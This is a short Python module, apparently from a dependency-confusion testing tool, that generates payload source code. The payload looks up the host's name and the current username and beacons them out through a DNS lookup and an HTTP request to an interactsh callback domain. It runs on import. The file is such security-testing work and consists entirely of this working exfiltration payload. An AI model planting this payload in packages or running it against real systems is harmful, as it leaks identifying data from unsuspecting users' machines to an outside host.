"""
Payload: interactsh
Sends a DNS/HTTP ping to an interact.sh domain for OOB detection.
"""


def generate_payload(callback_url: str) -> str:
    """Return Python source code for the interactsh payload."""
    return f'''import os, socket
from datetime import datetime

INTERACTSH_DOMAIN = "{callback_url}"

def execute_payload():
    hostname = socket.gethostname()
    username = os.getenv("USER") or os.getenv("USERNAME", "unknown")
    subdomain = f"{{username}}.{{hostname}}.{{INTERACTSH_DOMAIN}}"
    try:
        socket.gethostbyname(subdomain)
        print(f"[DepRaptor] DNS ping sent: {{subdomain}}")
    except Exception:
        pass
    try:
        import urllib.request
        urllib.request.urlopen(f"http://{{subdomain}}", timeout=5)
    except Exception:
        pass

execute_payload()
'''
